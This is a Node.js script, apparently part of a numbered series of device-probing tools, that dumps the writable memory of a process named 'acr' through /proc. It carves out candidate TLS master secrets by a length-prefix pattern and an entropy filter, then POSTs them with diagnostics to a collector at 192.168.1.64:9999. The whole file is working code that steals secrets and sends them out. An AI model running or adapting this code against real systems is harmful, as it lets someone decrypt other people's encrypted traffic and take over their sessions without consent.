"use strict";
// audit120.js - scan acr memory for TLS master secret candidates, POST to PC.
// Pattern: 30 00 00 00 (master_key_length=48) followed by 48 bytes.
// Also do entropy scan for high-entropy 48-byte blocks.
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 500000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

out.pidof = sh("pidof acr", 200);
var pid = trim(out.pidof).match(/^(\d+)/);
pid = pid ? pid[1] : null;
out.pid = pid;

if (!pid) {
    out.status = "NO_ACR";
    post("/p120_diag", out);
    post("/p120_done", { started: out.started });
} else {
    // dump memory
    out.dump = sh("cat /proc/" + pid + "/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.amap; > /tmp/acr_mem.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); dd if=/proc/" + pid + "/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/acr_mem.bin; done < /tmp/.amap; wc -c /tmp/acr_mem.bin", 1500);

    // structured search: 30 00 00 00 + 48 bytes
    out.structured = sh("grep -aob $'\\x30\\x00\\x00\\x00' /tmp/acr_mem.bin | head -1000 | cut -d: -f1", 30000);
    var offsets = trim(out.structured).split("\n").filter(function(x) { return x.trim().length > 0; });
    out.structured_count = offsets.length;

    // extract 48 bytes after each 30 00 00 00
    var candidates = [];
    for (var i = 0; i < Math.min(offsets.length, 500); i++) {
        var off = parseInt(offsets[i].trim());
        if (isNaN(off)) continue;
        var hex = trim(sh("dd if=/tmp/acr_mem.bin bs=1 skip=" + (off + 4) + " count=48 2>/dev/null | od -An -tx1 | tr -d ' \\n'", 200));
        if (hex.length == 96) {
            // filter: not all zeros, not repeated byte
            var unique = {};
            for (var j = 0; j < 96; j += 2) {
                unique[hex.substr(j, 2)] = true;
            }
            if (Object.keys(unique).length > 8) {  // high entropy
                candidates.push({ off: off, ms: hex });
            }
        }
    }
    out.structured_candidates = candidates.length;

    // also do a broader entropy scan: every 48 bytes, check entropy
    out.entropy_scan = sh("dd if=/tmp/acr_mem.bin bs=48 count=2000 2>/dev/null | od -A n -t x1 | awk '{for(i=1;i<=NF;i++) if($i!=\"00\") {print; break}}' | head -500", 30000);
    var entropy_lines = trim(out.entropy_scan).split("\n");
    out.entropy_lines = entropy_lines.length;

    // POST candidates
    out.candidates = candidates.slice(0, 200);
    post("/p120_candidates", out);
    post("/p120_done", { started: out.started });
}
